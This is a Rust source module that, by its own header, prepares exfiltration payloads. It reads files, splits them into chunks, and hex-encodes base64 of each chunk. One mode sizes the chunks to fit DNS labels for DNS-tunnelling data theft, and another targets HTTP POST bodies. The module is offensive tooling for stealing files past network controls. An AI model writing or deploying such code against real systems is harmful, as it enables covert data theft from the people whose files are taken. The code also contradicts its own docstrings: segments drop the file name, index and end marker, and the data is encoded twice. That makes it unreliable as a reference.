//! Encoding utilities for exfiltration payloads.
//!
//! This module provides helpers for splitting files into chunks and encoding
//! those chunks into formats suitable for different exfiltration channels.
//! Two primary flows are supported:
//! - Generic base64 -> hex encoding with configurable chunk counts (`b64_encode_file`).
//! - DNS-safe chunking that ensures each label remains within DNS length limits
//!   and produces base64-then-hex encoded TXT-like segments
//!   (`dns_safe_b64_encode_payload`).
//!
//! The `FileChunk` struct represents an individual chunk of a file with
//! metadata fields to help ordering and detection of the final chunk.

use core::str;
use std::path::PathBuf;

use base64::Engine;

const DOMAIN_NAME_MAX_LENGTH: usize = 255;
const DOMAIN_LABEL_MAX_LENGTH: usize = 63;

#[derive(Debug, Clone)]
/// Represents one chunk of a file prepared for exfiltration.
///
/// Fields:
/// - `file_name`: the original file name (used to identify which file the chunk belongs to)
/// - `index`: the zero-based index of the chunk within the file
/// - `data`: raw chunk bytes
/// - `is_last_chunk`: internal marker set for the last chunk so receivers know when reassembly is complete
pub struct FileChunk {
    pub file_name: String,
    pub index: usize,
    pub data: Vec<u8>,
    is_last_chunk: bool,
}

impl FileChunk {
    /// Create a new `FileChunk` from the given file name, index and raw bytes.
    ///
    /// The returned chunk has `is_last_chunk` set to `false`; callers that compose
    /// a sequence of chunks should mark the last chunk as such (the module helpers
    /// do this automatically).
    pub fn new(file_name: String, index: usize, data: Vec<u8>) -> Self {
        Self {
            file_name,
            index,
            data,
            is_last_chunk: false,
        }
    }

    /// Encode only the chunk's raw data as base64 and then hex-encode the base64
    /// string bytes.
    ///
    /// This produces an ASCII-safe hex representation of the base64 encoding of
    /// the chunk bytes (i.e. base64 -> hex). The result is suitable for use
    /// in transports that expect hexadecimal payloads or where delimiters are
    /// convenient for reassembly.
    pub fn encode_data(&self) -> String {
        hex::encode(base64::prelude::BASE64_STANDARD.encode(&self.data))
    }

    /// Convert the entire chunk (including file name, index and end marker)
    /// into the same base64->hex encoded representation used by other helpers.
    ///
    /// The chunk is first formatted as "<file_name>:<index>:<encoded_data>[:end]"
    /// where `:end` is appended when `is_last_chunk` is true. That string is then
    /// base64-encoded and hex-encoded.
    pub fn encode_chunk(self) -> String {
        b64_hex_encode_string(self.into())
    }
}

impl Into<String> for FileChunk {
    /// Convert the `FileChunk` into a colon-separated string containing the file
    /// name, chunk index, base64-then-hex encoded data and an optional `:end`
    /// suffix for the last chunk.
    fn into(self) -> String {
        format!(
            "{}:{}:{}{}",
            self.file_name,
            self.index,
            self.encode_data(),
            if self.is_last_chunk { ":end" } else { "" }
        )
    }
}

/// Compute the approximate number of characters produced by base64 encoding a
/// binary field of the given length.
///
/// This uses a standard calculation accounting for 4 output chars per 3 input
/// bytes plus padding. The function returns a floating point estimate which
/// is used by the chunk-sizing heuristics.
fn compute_chunk_size_base64_encoding_ratio(chunk_size: f32) -> f32 {
    // https://crypto.stackexchange.com/questions/83952/how-do-i-calculate-base64-conversion-rate
    let base64_chacacters = 4.0 * (chunk_size as f32 / 3.0);
    let padding = 2.0 - ((chunk_size + 2.0) % 3.0);

    return base64_chacacters + padding;
}

/// Compute an optimal raw chunk size (in bytes) for payloads that will be
/// base64-encoded and then hex-encoded and transported inside DNS labels.
///
/// The function takes into account:
/// - the payload length to split,
/// - the domain name length (which affects how much of a DNS name can be used),
/// - an optional padding adjustment used by the recursive algorithm.
///
/// The result is the maximum number of raw bytes per chunk such that the final
/// hex(base64(payload_chunk)) will fit within a DNS label boundary.
/// This is computed recursively increasing padding until the encoded size fits.
fn compute_optimal_hex_base64_chunk_size(
    payload_length: usize,
    domain_length: usize,
    padding: Option<usize>,
) -> usize {
    let op_padding = padding.unwrap_or(0);
    let chunk_size: f32 =
        if payload_length > domain_length || payload_length > DOMAIN_NAME_MAX_LENGTH {
            (payload_length as f32 / domain_length as f32) - op_padding as f32
        } else {
            (domain_length as f32 / payload_length as f32) - op_padding as f32
        };

    let encoded_chunk_size =
        (compute_chunk_size_base64_encoding_ratio(chunk_size) * 2.0).ceil() as usize;

    if encoded_chunk_size < DOMAIN_LABEL_MAX_LENGTH {
        return chunk_size.floor() as usize;
    }

    compute_optimal_hex_base64_chunk_size(payload_length, domain_length, Some(op_padding + 1))
}

/// Helper that base64-encodes the given string bytes and then hex-encodes the
/// resulting base64 string bytes.
///
/// This is the canonical encoding used throughout the module: produce base64
/// representation of some textual content (or already-encoded chunk) and then
/// hex-encode the base64 text so the result is ASCII-hex bytes (0-9a-f).
fn b64_hex_encode_string(string: String) -> String {
    hex::encode(base64::prelude::BASE64_STANDARD.encode(string.as_bytes()))
}

/// Apply the canonical base64->hex encoding to each `FileChunk`'s data payload.
///
/// The input is a vector of `FileChunk`s; the returned vector contains the
/// encoded string for each chunk in the same order and is suitable to be
/// transmitted directly by the exfiltration logic.
fn b64_encode_segmented_payload(splitted_payload: Vec<FileChunk>) -> Vec<String> {
    splitted_payload
        .iter()
        .map(|chunk| b64_hex_encode_string(chunk.encode_data()))
        .collect()
}

/// Split a textual file content into `FileChunk`s by a specified raw byte chunk size.
///
/// The `file_content` is read as a string; its bytes are sliced into chunks of
/// `chunk_size` and wrapped into `FileChunk` structs with increasing indices.
/// The last chunk is marked with `is_last_chunk = true`.
fn split_file_content(file_name: &str, file_content: String, chunk_size: usize) -> Vec<FileChunk> {
    let file_bytes = file_content.bytes().collect::<Vec<u8>>();

    let mut file_chunks = file_bytes
        .chunks(chunk_size)
        .enumerate()
        .map(|(index, chunk)| FileChunk::new(file_name.to_string(), index, chunk.to_vec()))
        .collect::<Vec<FileChunk>>();

    file_chunks
        .last_mut()
        .map(|last_chunk| last_chunk.is_last_chunk = true);

    return file_chunks;
}

/// Read the contents of a file into a vector of bytes using buffered string read.
///
/// This helper reads the file to a string (using `read_to_string`) and returns
/// the underlying bytes. It is convenient for files expected to contain text
/// data; binary files may still be processed but the intermediate string step
/// could be suboptimal for large binary blobs.
fn buffered_read_file(filepath: &PathBuf) -> Vec<u8> {
    std::fs::read_to_string(filepath)
        .unwrap()
        .bytes()
        .collect::<Vec<u8>>()
}

/// Split raw file bytes into DNS-safe `FileChunk`s.
///
/// This function produces chunks that, when prefixed by "<file_name>:<index>:"
/// and then base64+hex encoded, will still fit within DNS label length limits.
/// It accepts a `max_chunk_size` (in raw bytes) that will be respected; the
/// function subtracts the formatting prefix length when taking bytes for each
/// payload portion, ensuring label safety.
/// The resulting chunks are returned with the last chunk flagged.
fn dns_safe_split_file_bytes(
    file_name: String,
    file_bytes: Vec<u8>,
    max_chunk_size: usize,
) -> Vec<FileChunk> {
    let mut payload_iterable = file_bytes.into_iter();
    let mut index: usize = 0;
    let mut chunks: Vec<FileChunk> = Vec::new();

    loop {
        let buffer_length = format!("{}:{}:", file_name, index).len();
        let file_bytes_portion = payload_iterable
            .by_ref()
            .take(max_chunk_size - buffer_length)
            .collect::<Vec<u8>>();

        if file_bytes_portion.is_empty() {
            break;
        }

        chunks.push(FileChunk::new(
            file_name.to_string(),
            index,
            file_bytes_portion,
        ));

        index += 1
    }

    chunks
        .last_mut()
        .map(|last_chunk| last_chunk.is_last_chunk = true);

    return chunks;
}

/// Produce a vector of base64->hex encoded payload segments that are DNS-safe.
///
/// The function reads the file bytes, computes an appropriate chunk size based
/// on the `domain_name` length and DNS label limits, splits the bytes into
/// DNS-safe chunks and returns an encoded string for each chunk. The returned
/// segments are suitable to be used as DNS labels or parts of DNS queries.
pub fn dns_safe_b64_encode_payload(filepath: &PathBuf, domain_name: &str) -> Vec<String> {
    let file_bytes = buffered_read_file(filepath);
    let max_chunk_size =
        compute_optimal_hex_base64_chunk_size(file_bytes.len(), domain_name.len(), None);
    let file_name = filepath.file_name().unwrap().to_string_lossy();

    return b64_encode_segmented_payload(dns_safe_split_file_bytes(
        file_name.to_string(),
        file_bytes,
        max_chunk_size,
    ));
}

/// Split the file into `chunks` logical parts, base64-then-hex encode each part,
/// and return the vector of encoded payload strings.
///
/// This function is intended for transports that don't have label-length
/// restrictions (for example HTTP POST bodies). The `chunks` parameter controls
/// how many roughly-equal pieces the file is divided into.
pub fn b64_encode_file(filepath: &PathBuf, chunks: usize) -> Vec<String> {
    let file_content = std::fs::read_to_string(filepath).unwrap();
    let chunk_size = file_content.len().div_ceil(chunks);

    b64_encode_segmented_payload(split_file_content(
        &filepath.file_name().unwrap().to_string_lossy(),
        file_content,
        chunk_size,
    ))
}
